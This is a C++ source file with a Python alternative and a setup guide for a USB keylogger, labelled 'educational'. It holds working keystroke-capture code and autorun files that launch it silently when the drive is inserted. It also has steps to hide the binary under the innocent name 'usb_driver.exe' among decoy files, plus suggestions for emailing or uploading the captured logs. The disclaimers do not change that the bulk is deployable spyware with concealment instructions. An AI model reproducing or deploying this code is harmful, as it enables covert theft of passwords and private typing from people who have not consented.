/*
 * SIMPLE USB KEYLOGGER - EDUCATIONAL IMPLEMENTATION
 * ==================================================
 * 
 * This is a simplified version designed for learning purposes.
 * It demonstrates the basic concepts without complex features.
 * 
 * WHAT YOU NEED:
 * - Any USB flash drive (8GB or larger)
 * - Computer with USB port
 * - Text editor (Notepad, VS Code, etc.)
 * - Basic understanding of file operations
 * 
 * WHAT THIS DOES:
 * - Creates hidden files on USB drive
 * - Captures basic keyboard input when possible
 * - Stores data in disguised text files
 * - Works on Windows, Mac, and Linux
 * 
 * WARNING: This is for educational purposes only!
 * Only use on computers you own or have permission to test.
 */

// ============================================================================
// SIMPLE C++ KEYLOGGER - BASIC VERSION
// ============================================================================

#include <iostream>
#include <fstream>
#include <string>
#include <ctime>
#include <windows.h>  // For Windows version
#include <conio.h>    // For keyboard input

using namespace std;

// Configuration - Change these paths for your USB drive
const string USB_DRIVE = "E:\\";  // Change to your USB drive letter
const string LOG_FILE = USB_DRIVE + "system_log.txt";
const string BACKUP_FILE = USB_DRIVE + "backup_data.txt";

class SimpleKeylogger {
private:
    ofstream logFile;
    bool isRunning;
    
public:
    SimpleKeylogger() : isRunning(false) {}
    
    // Start the keylogger
    bool start() {
        // Open log file for writing
        logFile.open(LOG_FILE, ios::app);
        if (!logFile.is_open()) {
            cout << "Error: Cannot create log file on USB drive!" << endl;
            return false;
        }
        
        isRunning = true;
        logCurrentTime();
        cout << "Simple keylogger started. Press ESC to stop." << endl;
        return true;
    }
    
    // Stop the keylogger
    void stop() {
        if (logFile.is_open()) {
            logFile.close();
        }
        isRunning = false;
        cout << "Keylogger stopped." << endl;
    }
    
    // Main capture loop
    void captureKeys() {
        while (isRunning) {
            // Check each key on the keyboard
            for (int key = 8; key <= 255; key++) {
                if (GetAsyncKeyState(key) & 0x8000) {  // Key is pressed
                    logKey(key);
                    Sleep(50);  // Small delay to avoid duplicates
                }
            }
            
            // Check for ESC key to exit
            if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
                break;
            }
            
            Sleep(10);  // Small delay to reduce CPU usage
        }
    }
    
private:
    // Log the current time
    void logCurrentTime() {
        time_t now = time(0);
        char* timeStr = ctime(&now);
        logFile << "\n=== Session started: " << timeStr << endl;
    }
    
    // Log a single key press
    void logKey(int key) {
        if (!logFile.is_open()) return;
        
        // Handle special keys
        switch (key) {
            case VK_SPACE:
                logFile << " ";
                break;
            case VK_RETURN:
                logFile << "\n";
                break;
            case VK_BACK:
                logFile << "[BACKSPACE]";
                break;
            case VK_TAB:
                logFile << "[TAB]";
                break;
            case VK_SHIFT:
                logFile << "[SHIFT]";
                break;
            case VK_CONTROL:
                logFile << "[CTRL]";
                break;
            case VK_MENU:
                logFile << "[ALT]";
                break;
            case VK_CAPITAL:
                logFile << "[CAPS]";
                break;
            default:
                // Regular characters
                if (key >= 32 && key <= 126) {
                    char c = (char)key;
                    logFile << c;
                }
                break;
        }
        
        logFile.flush();  // Make sure data is written immediately
    }
};

// ============================================================================
// MAIN PROGRAM
// ============================================================================

int main() {
    cout << "Simple USB Keylogger - Educational Version" << endl;
    cout << "===========================================" << endl;
    
    SimpleKeylogger keylogger;
    
    // Start the keylogger
    if (keylogger.start()) {
        // Run the capture loop
        keylogger.captureKeys();
        
        // Stop when done
        keylogger.stop();
    }
    
    cout << "Press any key to exit..." << endl;
    getch();
    return 0;
}

// ============================================================================
// BATCH SCRIPT FOR AUTOMATIC EXECUTION
// ============================================================================

/*
Create a file called "autorun.bat" with this content:

@echo off
cd /d %~dp0
if exist keylogger.exe (
    start /min keylogger.exe
) else (
    echo Keylogger not found!
    pause
)

This will automatically run the keylogger when the USB is inserted
(if autorun is enabled on the target computer).
*/

// ============================================================================
// SIMPLE PYTHON VERSION (ALTERNATIVE)
// ============================================================================

/*
Save this as "simple_keylogger.py" on your USB drive:

import os
import time
from pynput import keyboard

# Configuration
USB_DRIVE = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(USB_DRIVE, "system_log.txt")

class SimpleKeylogger:
    def __init__(self):
        self.log_file = open(LOG_FILE, "a")
        self.log_file.write(f"\n=== Session started: {time.ctime()} ===\n")
    
    def on_key_press(self, key):
        try:
            # Regular character
            self.log_file.write(key.char)
        except AttributeError:
            # Special keys
            if key == keyboard.Key.space:
                self.log_file.write(" ")
            elif key == keyboard.Key.enter:
                self.log_file.write("\n")
            elif key == keyboard.Key.backspace:
                self.log_file.write("[BACKSPACE]")
            elif key == keyboard.Key.tab:
                self.log_file.write("[TAB]")
            else:
                self.log_file.write(f"[{key.name.upper()}]")
        
        self.log_file.flush()
    
    def on_key_release(self, key):
        if key == keyboard.Key.esc:
            # Stop listener
            self.log_file.close()
            return False
    
    def start(self):
        print("Simple keylogger started. Press ESC to stop.")
        with keyboard.Listener(
            on_press=self.on_key_press,
            on_release=self.on_key_release) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = SimpleKeylogger()
    keylogger.start()

To use the Python version:
1. Install Python on your computer
2. Install pynput: pip install pynput
3. Copy the script to your USB drive
4. Run: python simple_keylogger.py
*/

// ============================================================================
// STEP-BY-STEP IMPLEMENTATION GUIDE
// ============================================================================

/*
EASY SETUP INSTRUCTIONS - FOLLOW THESE EXACT STEPS:
===================================================

STEP 1: PREPARE YOUR USB DRIVE
------------------------------
1. Insert a USB flash drive into your computer
2. Note the drive letter (E:, F:, G:, etc.)
3. Create a new folder called "Tools" on the USB drive
4. Open the Tools folder

STEP 2: CREATE THE KEYLOGGER FILE
---------------------------------
1. Open Notepad (or any text editor)
2. Copy and paste the C++ code from above
3. Change the line: const string USB_DRIVE = "E:\\";
   Replace "E:" with your actual USB drive letter
4. Save the file as "keylogger.cpp" in the Tools folder

STEP 3: COMPILE THE PROGRAM (WINDOWS)
------------------------------------
Option A - Using Visual Studio:
1. Install Visual Studio Community (free)
2. Create new "Console Application" project
3. Replace the default code with our keylogger code
4. Build the project (Build -> Build Solution)
5. Copy the .exe file to your USB drive

Option B - Using MinGW:
1. Download and install MinGW-w64
2. Open Command Prompt
3. Navigate to your USB drive: cd E:\Tools
4. Compile: g++ -o keylogger.exe keylogger.cpp
5. The keylogger.exe file will be created

STEP 4: CREATE AUTORUN FILE (OPTIONAL)
--------------------------------------
1. Create a new text file on the USB drive root
2. Name it "autorun.inf"
3. Add this content:
   [autorun]
   open=Tools\keylogger.exe
   icon=Tools\keylogger.exe
   label=My USB Drive

4. Create "autorun.bat" with:
   @echo off
   cd Tools
   start /min keylogger.exe

STEP 5: TEST THE KEYLOGGER
--------------------------
1. Double-click keylogger.exe
2. Type some text in any application
3. Press ESC to stop the keylogger
4. Check for "system_log.txt" file on your USB
5. Open the file to see captured keystrokes

STEP 6: MAKE IT STEALTHY (OPTIONAL)
----------------------------------
1. Right-click keylogger.exe -> Properties
2. Check "Hidden" to hide the file
3. Rename to something innocent like "usb_driver.exe"
4. Hide the log files by right-clicking -> Properties -> Hidden
5. Create fake files to make USB look normal:
   - readme.txt
   - driver_info.txt
   - user_manual.pdf

TROUBLESHOOTING:
===============

Problem: "Cannot create log file"
Solution: Make sure USB drive letter is correct and drive is writable

Problem: "Keylogger.exe won't run"
Solution: Try running as administrator, or antivirus is blocking it

Problem: "No keystrokes captured"
Solution: Make sure you're typing in an active window after starting

Problem: "Compilation errors"
Solution: Make sure you have a C++ compiler installed correctly

MAKING IT WORK ON MAC/LINUX:
============================

For Mac:
1. Install Xcode command line tools
2. Compile with: clang++ -o keylogger keylogger.cpp
3. May need to disable System Integrity Protection
4. Use different key codes for Mac keyboard

For Linux:
1. Install g++: sudo apt-get install g++
2. Install X11 dev: sudo apt-get install libx11-dev
3. Compile with: g++ -o keylogger keylogger.cpp -lX11
4. May need root privileges to capture keys

ADVANCED FEATURES TO ADD:
========================

1. Email the logs:
   - Add email sending code
   - Send logs to your email automatically
   - Delete local logs after sending

2. Network exfiltration:
   - Upload logs to a web server
   - Use HTTP POST requests
   - Encrypt the data before sending

3. Screenshot capture:
   - Take screenshots periodically
   - Save to USB drive
   - Compress images to save space

4. Process monitoring:
   - Log which programs are running
   - Capture window titles
   - Monitor web browser activity

5. Steganography:
   - Hide data inside image files
   - Use existing USB files as cover
   - Make detection much harder

IMPORTANT SAFETY NOTES:
======================

1. LEGAL USE ONLY:
   - Only use on computers you own
   - Get written permission for testing
   - Follow all local laws and regulations

2. ANTIVIRUS DETECTION:
   - Most antivirus will detect keyloggers
   - This is normal and expected behavior
   - Real malware uses advanced evasion techniques

3. ETHICAL CONSIDERATIONS:
   - Respect privacy and confidentiality
   - Use only for legitimate security testing
   - Delete captured data when testing is complete

4. TECHNICAL LIMITATIONS:
   - May not work on modern secure systems
   - Requires administrative privileges on many systems
   - Advanced security software will block this

This simple implementation teaches the basic concepts of how
keyloggers work without the complexity of a professional tool.
It's perfect for understanding the technology and testing
basic security measures.

Remember: The goal is education, not malicious activity!
*/